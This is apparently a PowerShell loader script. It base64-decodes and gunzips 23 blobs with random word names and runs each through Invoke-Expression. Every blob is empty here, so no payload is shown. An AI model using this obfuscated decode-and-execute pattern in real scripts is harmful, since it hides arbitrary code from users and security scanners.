#Requires -Version 2

$Expurgates = ""
$Congestion = ""
$Starfishes = ""
$Periodical = ""
$Excretions = ""
$Calibrator = ""
$Charbroils = ""
$Numbskulls = ""
$Cullenders = ""
$Worcesters = ""
$Angiosperm = ""
$Negativity = ""
$Pronounced = ""
$Bifurcates = ""
$Chronicler = ""
$Godparents = ""
$Infuriates = ""
$Louisianan = ""
$Apollonian = ""
$Intermezzo = ""
$Occasioned = ""
$Synonymous = ""
$Pluperfect = ""

function ConvertFrom-Gzip {
    [CmdletBinding()] param([byte[]] $Bytes)
    $is = New-Object IO.MemoryStream(, $Bytes)
    $gs = New-Object IO.Compression.GzipStream $is, ([IO.Compression.CompressionMode]::Decompress)
    $sr = New-Object IO.StreamReader($gs)
    $sbd = $sr.ReadToEnd()
    $sr.Close()
    $gs.Close()
    $is.Close()
    $sbd
}

$Modules = @($Expurgates,$Congestion,$Starfishes,$Periodical,$Excretions,$Calibrator,$Charbroils,$Numbskulls,$Cullenders,$Worcesters,$Angiosperm,$Negativity,$Pronounced,$Bifurcates,$Chronicler,$Godparents,$Infuriates,$Louisianan,$Apollonian,$Intermezzo,$Occasioned,$Synonymous,$Pluperfect)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    ConvertFrom-Gzip -Bytes $Decoded | Invoke-Expression
}
